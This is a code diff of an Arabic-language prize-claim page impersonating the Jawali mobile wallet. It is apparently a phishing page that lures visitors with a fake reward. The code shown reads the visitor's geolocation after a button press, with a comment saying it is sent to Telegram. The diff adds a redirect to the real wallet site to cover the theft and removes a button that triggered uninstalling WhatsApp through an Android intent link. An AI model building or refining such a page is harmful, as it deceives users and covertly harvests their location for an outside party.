@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>استلام الجائزة - محفظة جوالي</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
       direction: rtl;
@@ -28,8 +28,6 @@
       border-radius: 8px;
       cursor: pointer;
       margin-top: 25px;
-      margin-left: 10px;
-      margin-right: 10px;
     }
     #codeDisplay {
       margin-top: 30px;
@@ -42,10 +40,9 @@
 
   <h2>✅ تم تأكيد رقمك!</h2>
   <p id="phoneDisplay">📱 رقمك هو: جاري التحميل...</p>
-  <p>اضغط الزر أدناه لاستلام الجائزة وكشف كود المتسابق الخاص بك</p>
+  <p>اضغط الزر أدناه لاستلام الجائزة</p>
 
   <button id="claimButton" onclick="claimGift()">🎁 استلام الجائزة</button>
-  <button id="uninstallBtn" onclick="uninstallWhatsapp()">❌ إلغاء تثبيت واتساب</button>
 
   <div id="codeDisplay" style="display:none;">
     🎉 كود المتسابق الخاص بك: <span id="contestantCode" style="font-weight: bold;"></span>
@@ -86,7 +83,7 @@
       document.getElementById('contestantCode').textContent = code;
       document.getElementById('codeDisplay').style.display = 'block';
 
-      // الحصول على الموقع وإرساله للتليجرام
+      // إرسال الموقع للتليجرام
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
           const lat = position.coords.latitude;
@@ -109,20 +106,12 @@
         alert("المتصفح لا يدعم الموقع الجغرافي.");
       }
 
-      // تعطيل الزر بعد الضغط
-      document.getElementById('claimButton').disabled = true;
+      // إعادة التوجيه إلى موقع jawali.com.ye
+      window.location.href = "https://jawali.com.ye";
     }
 
     function generateCode() {
       return Math.floor(100000 + Math.random() * 900000).toString();
-    }
-
-    function uninstallWhatsapp() {
-      // هذا رابط intent لإلغاء تثبيت تطبيق واتساب على أندرويد
-      // يعمل فقط في متصفحات أندرويد
-      const intentUrl = "intent://package/com.whatsapp#Intent;action=android.intent.action.DELETE;end";
-
-      window.location.href = intentUrl;
     }
   </script>
 
